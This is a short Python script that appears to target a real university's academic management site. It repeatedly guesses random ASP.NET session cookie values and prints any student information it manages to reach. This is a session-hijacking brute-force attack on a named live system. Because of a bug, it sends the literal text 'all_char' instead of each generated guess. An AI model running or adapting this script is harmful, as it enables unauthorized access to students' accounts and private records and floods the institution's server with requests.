# import csv
# import time
# # with open('data.csv','w') as f:
# # 	writer=csv.writer(f,delimiter='+')
# # 	writer.writerow(['id','name','age'])
# # 	writer.writerow(['10021','Bob',20])
# # 	writer.writerow(['10002','Mike',22])
# # 	
# time=time.time()
# print(time)

import requests
import random
from bs4 import BeautifulSoup

url='http://jwglxt.aynu.edu.cn/PUB/foot.aspx'

def analyse(info,i):
	cookie_info='_gscu_996030535=51706420mkn7bt98; _gscbrs_996030535=1; ASP.NET_SessionId={}; _gscs_996030535=t517088392x2j7t98|pv:2'.format(info)
	headers={
		'cookie':cookie_info,
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',
		'Host': 'jwglxt.aynu.edu.cn',
		'Referer': 'http://jwglxt.aynu.edu.cn/MAINFRM.aspx',
		'Upgrade-Insecure-Requests': '1',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
		'Accept-Encoding': 'gzip, deflate',
		'Accept-Language': 'zh-CN,zh;q=0.9',
		'Connection' : 'keep-alive'
	}
	r=requests.get(url,headers=headers)
	html=r.text
	soup=BeautifulSoup(html,'html.parser')
	stu_info=soup.find('span',attrs={'id':'lbl_userinfo'}).string
	if(len(stu_info)>5):
		print(stu_info)
	else:
		print('没有'+str(i))

def random_num():
	for i in range(100000):
		all_char=''
		for j in range(24):
			random_char=random.choice('abcdefghijklmnopqrstuvwxyz0123456789')
			all_char+=str(random_char)
		analyse('all_char',i)
random_num()